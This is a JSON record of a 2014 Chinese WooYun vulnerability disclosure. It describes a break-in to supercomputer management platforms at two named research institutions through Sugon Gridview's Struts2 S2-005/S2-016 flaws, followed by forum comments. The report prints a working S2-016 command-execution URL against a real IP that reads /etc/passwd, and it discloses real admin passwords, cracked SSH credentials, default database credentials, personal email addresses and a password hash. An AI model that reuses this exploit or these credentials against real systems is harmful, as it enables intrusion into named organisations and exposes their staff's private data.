{"id": 3046, "wybug_id": "wooyun-2014-056890", "wybug_title": "利用中科曙光集群管控平台漏洞轻松拿下超级计算机中心", "wybug_corp": "sugon.com", "wybug_author": "hacker@sina.cn", "wybug_date": "2014-04-13 08:21", "wybug_open_date": "2014-07-09 10:16", "wybug_type": "远程代码执行", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-18：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向公众公开  简要描述： 最近在研究GPU群集，准备把手里的工作站升级一下，看了网上相关成功案例后，再看看手里的老山炮 一下子就迷茫了(显卡烧坏好几块了 =.=~#)。记得去年阿里的空虚浪子心在OWASP会上讲过hadoop的成功案例，还说如果能成功入职就有希望在这套系统里执行上一条命令，当时把我羡慕的嘴都合不上了，所以早就想搞一超算中心拿来爽一把了，这不就让我赶上一回。13TB内存、4864核CPU、80块Tesla K20 呵呵呵呵呵 详细说明：  Gridview集群监控管理系统这是一款由中科曙光公司研发的大规模服务器集群管理软件 拥有强大的工作负载管理平台，用于简化HPC(超级计算机)集群的日常管理操作。具备监管超过5000个节点 大规模高性能计算中心或数据中心集群能力，该系统广泛应用于各大科研机构、高等院校的超级计算中心。产品信息：http://www.sugon.com/product/detail/productid/105.html 管理手册(据此了解到存在默认的MYSQL帐号和密码 root/root123)http://wenku.baidu.com/view/dbce51e7195f312b3069a501.html谷歌搜寻关键词：登录  /gridview_portal本次测试包含以下单位：1、中科院理论物理研究所2、华南师范大学网络中心\t测试过程简介：中科院某研究所的问题在于他们将具有重要信息的文档直接放在了所有人都可以访问的公网WEB门户上，文档中所涉及到的一些IP及内网拓扑部署情况均应为机要信息，不宜发布在公网，且文档内标识的专用于内网访问的存储系统管理平台却直接被允许了公网访问，这一结果违反了确保其安全的初衷，使得安全性极大的降低，一旦此类应用系统出现漏洞，将危及整个超算中心甚至机构内部的安全。\t根据ParaStor平台采用的Struts框架测试得出系统存在S2-005、S2-016高危命令执行漏洞，并且应用运行于root权限,直接取得了服务器最高管理权，且通过该台服务器作为跳板可直接访问核心管理平台。结合网上发布的管理手册文档发现这两个管理平台使用了默认的数据库帐号/密码，结合数据库配置文件确认了一致性，能够成功登录数据库获取平台管理员帐号密码，且该密码在Gridview管控系统中是明文存储的，并存在弱口令的情况。\t当非授权人员以管理员权限登录到Gridview管理平台后，可以批量对所有分布式服务器执行命令、文件、关机、用户管理等操作，相当于取得了该集群所有主机的控制权。测试结果：所有已发现信息均整理在这里，WEBSHELL已经清除，系统中未留后门，亦未对除以下信息外的任何数据进行非法下载。通报建议：请协助通报中科曙光公司及本次测试所含单位。   漏洞证明：  \n\n\n\n\n\n\n\n\n\n\n\n\n\n实例1：中科院理论物理研究所HPC配置文档：http://www.itp.cas.cn/kxjs/fwzn/gxnjs/201309/P020130902605808036467.pdf基于2.6版本的Gridview系统已探知两个Struts2框架命令执行漏洞：http://struts.apache.org/release/2.3.x/docs/s2-005.htmlhttp://struts.apache.org/release/2.3.x/docs/s2-016.html漏洞网址：http://159.226.161.105:6080/gridview_portal/login.actionGridview 2.6管理平台管理员信息：admin●admin\t/\troot●sugon;!@#\t邮箱：houfy@kitpc.ac.cnParaStor存储管理平台管理员信息：admin●sugon;!@#  \t\t\t\t\t\t邮箱：houfy@139.comshadow破解出的两个ssh帐号：zhougaoliang●chen2zi3yangziqing●chen2zi3\t（可登录ParaStor存储管理平台）数据库配置信息：地址：jdbc:mysql://127.0.0.1:3309/gv_local帐密：root●root123网站物理路径： /tmp/tomcat-gridview_portal4547479399001117259.osgi系统版本：CentOS release 6.2 (Final)内核版本：2.6.32-220.el6.x86_64 i386当前用户：rootS2-016 EXP示例:http://159.226.161.105:6080/gridview_portal/login.action?redirect:${%23s%3dnew java.util.ArrayList(),%23x%3dnew java.lang.String(\"cat\"),%23xx%3dnew java.lang.String(\"/etc/passwd\"),%23s.add(%23x),%23s.add(%23xx),%23a%3dnew java.lang.ProcessBuilder(%23s).start().getInputStream(),%23b%3dnew java.io.InputStreamReader(%23a),%23c%3dnew java.io.BufferedReader(%23b),%23d%3dnew char[51020],%23c.read(%23d),%23dddddd%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23dddddd.println(%23d),%23dddddd.close()}实例2：漏洞网址：http://222.200.128.65:8080/gridview_portal/login.action系统版本：Welcome to SUSE Linux Enterprise Server 10 SP2 (x86_64)网站物理路径： /tmp/tomcat-gridview_portal6113238832243596521.osgi系统版本: 2.6.16.60-0.42.4-smp i386当前用户: root用户哈希：root:$2a$10$Bct8k8UAbHRuGNuJ6OnhROu4UkYteXvW/qEWK0qzWlWI6asIrxvSG:15621::::::   修复方案：  请联系厂家售后技术支持热线：400-810-0466   版权声明：转载请注明来源 hacker@sina.cn@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-07-09 10:16 厂商回复：  最新状态： 2014-04-19：更新一下处置情况，在14日，CNCERT已经通过以往渠道，向软件生产厂商曙光公司通报，同时根据测试用例，向教育网和科技网应急组织通报。  ", "replys": "漏洞评价：\n评论\n     2014-04-13 08:51 |    \t\txxw \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:18        | 中国梦)\t\t \n  撸主是黑客~~~我一眼就看出来了！    \n     2014-04-13 09:07 |    \t\t西北狼 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:5        | 来自大漠的苦逼程序员)\t\t \n  撸主屌炸了    \n     2014-04-13 09:31 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  高端大气上档次    \n     2014-04-13 09:36 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  执行下片命令哈。。    \n     2014-04-13 09:49 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  mark，针对科研院所的事件周一重点处置一下。该产品此前已经处置过这个通用漏洞。    \n     2014-04-13 09:49 |    \t\t漠惘 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 专注护妹三十年，没有高潮不要钱！)\t\t \n  挖比特币啊    \n     2014-04-13 10:15 |    \t\t肥猪 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 无)\t\t \n  我擦！流逼死了    \n     2014-04-13 10:15 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  叼    \n     2014-04-13 10:23 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  测试一下一分钟能挖多少个比特币。。    \n     2014-04-13 10:35 |    \t\tylaxfcy \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:28        | 技术无黑白，但是人有)\t\t \n  牛逼啊牛逼    \n     2014-04-13 11:08 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  亮瞎了    \n     2014-04-13 11:52 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  有次进去过个物理所还是什么所的，貌似不通网，只能在内网晃悠。    \n     2014-04-13 12:02 |    \t\tSunshine \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:10        | Nothing.)\t\t \n  @无敌L.t.H 一堆集群，不知道是不是做负载均衡用的。    \n     2014-04-13 12:40 |    \t\t好人 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:6        | 多少人曾爱慕你年轻的容颜)\t\t \n  mark    \n     2014-04-13 15:42 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  @YY-2012 目测挖不了多少，现在都有专门的AES芯片，一台就能有几THS算力    \n     2014-04-13 15:59 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  NB    \n     2014-04-13 16:01 |    \t\taaaaty \t\t\t( 实习白帽子  |\t\t\t        Rank:83 漏洞数:28        | 爱情就像，我问服务器whoami，它说root)\t\t \n  mark    \n     2014-04-13 17:14 |    \t\tyuer \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 我其实是菜鸟。。。)\t\t \n  牛逼不解释。。。    \n     2014-04-13 20:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  核心    \n     2014-04-14 08:13 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  围观    \n     2014-04-16 13:38 |    \t\t1fn0 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:7        | 我是运维 不要开除我)\t\t \n  前方高能 围观    \n     2014-04-18 11:05 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @cncert国家互联网应急中心 您们忽略了?    \n     2014-04-18 12:06 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  呵呵    \n     2014-04-19 14:12 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  有处置就好 下次报个一台主机搞定全省网络之类的斯诺登案例    \n     2014-04-19 14:14 |    \t\tKobs \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 魅力无处不在，预见即是未来)\t\t \n  牛X    \n     2014-04-19 16:48 |    \t\t小夜 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:8        | 漫长的日子)\t\t \n  洞主就是小说里的黑客 我看出来了 对了哥们啥时候我们也入侵一个卫星玩玩    \n     2014-04-26 03:56 |    \t\tMayter \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:10        | 没事瞎搞。)\t\t \n  吊炸天。。继续围观黑阔    \n     2014-06-05 23:22 |    \t\tabcdlzy \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:14        | 好好学习，天天向上。)\t\t \n  CNVD-C-2013-02870 \t中科曙光Gridview管理软件struts2漏洞 \t未归档 \t2013-09-27想哭了....    \n     2014-07-09 10:57 |    \t\tM0nster \t\t\t( 实习白帽子  |\t\t\t        Rank:53 漏洞数:17        | 允许我国的艺术家先富起来)\t\t \n  洞主你是一个黑客    \n     2014-07-09 11:02 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  好牛逼、洞主收了我吧    \n     2014-07-09 12:14 |    \t\t博丽灵梦 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:7        | = =cf)\t\t \n  拿来挖比特币岂不是赚翻了    \n     2014-07-09 12:59 |    \t\t小小泥娃 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | 高二)\t\t \n  雷军：“渣渣，跟我比跑分？”    \n     2014-07-09 15:20 |    \t\tcuger \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:44        | 这个家伙很懒，什么也没留下)\t\t \n  之前遇到一个，但是不存在struts2漏洞啊。。。。    \n     2014-07-10 11:52 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  忽略了？洞主果断rm -rf    \n     2014-07-10 12:04 |    \t\t小小泥娃 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | 高二)\t\t \n  @Stardustsky 哈哈哈哈哈哈哈哈哈哈    \n     2014-07-10 21:52 |    \t\t小螺号 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 小螺号呀嘀嘀的~~~~~~吹)\t\t \n  基本上用的都是英伟达的丽台显卡～cuda挖矿速度剧慢    \n     2014-07-10 22:16 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  丽台主要是稳定,可以7X24去跑， ATI行么？屎    \n     2014-07-10 22:47 |    \t\t小螺号 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 小螺号呀嘀嘀的~~~~~~吹)\t\t \n  我挖过～一个n卡丽台～速度是50几M……你觉得就算7*24有什么意义～我挖了一个礼拜受不了了就停了    \n     2014-07-10 23:08 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  我不是说在挖矿的意义 ，你们也就知道挖矿     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}